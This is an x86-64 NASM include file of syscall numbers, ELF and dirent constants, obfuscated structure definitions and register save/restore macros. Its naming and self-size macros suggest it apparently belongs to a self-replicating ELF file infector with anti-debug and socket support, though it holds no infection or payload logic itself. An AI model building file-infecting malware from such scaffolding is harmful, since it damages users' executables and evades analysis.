; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - uKLa1Xikg_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - WciGNPwfF_size) + x]

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

struc uKLa1Xikg
.NqjDxZc resb PAGE_SIZE
.d8cXdP7geG: resb PAGE_SIZE
.fsMfH53 resq 1
.jrF2vT2hTw: resd 1
.OLO4J: resd 1
.G2PvfjN8U8 resq 1
endstruc

struc WciGNPwfF
.Od0nn6UtIm resq 1
.FLDLq7 resq 1
.QnIa96RO7 resq 1
.H3M8mMS resb 1
.GQ6mVfY resq 1
.pWgRQ0jmJQ resq 1
.i30iAx resq 1
.Z4CQ7 resq 1
.Zurkv8KM resq 1 
.HvqzyX resq 1
.ppN5MpX resq 1
.bd3qI resb 1
.vJnblqxvc resq 1
.c5rgkdfB resq 1
.V8YviR resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc DGJDlg1Qp
.nlenHA9mOb: resb 16
.mQSurSE9fk: resw 1
.FgRIvqCP: resw 1
.piRqZcCj: resd 1
.vrYH6uE: resq 1
.Basib: resq 1
.nPG4fUBH: resq 1
.BuFnk0: resd 1
.UfdvN1M: resw 1
.Pq8dxFSBU: resw 1
.eo6VTFRAUa: resw 1
.mhqDffFwfZ: resw 1
.jvnTs: resw 1
.r4DbV9: resw 1
endstruc

struc tJI8UeYpx5
.Ral9aZ9H: resd 1
.tUaMbk: resd 1
.bzmsFkL: resq 1
.uuTBubCHYZ: resq 1
.ra93rsT: resq 1
.ZJDaHm: resq 1
.Zwrc7YbyKD: resq 1
.uAWYHRu87: resq 1
endstruc

struc G20tFVqz
.s1bYj: resd 1
.mhlfIAa7b: resd 1
.Kkjhw: resq 1
.clUEKD: resq 1
.QlWZa: resq 1
.BMOtXLa2k: resq 1
.XoMYF9: resd 1
.eeYxuvjf: resd 1
.vErrVCC4VK resq 1
.fdwQjGOW resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 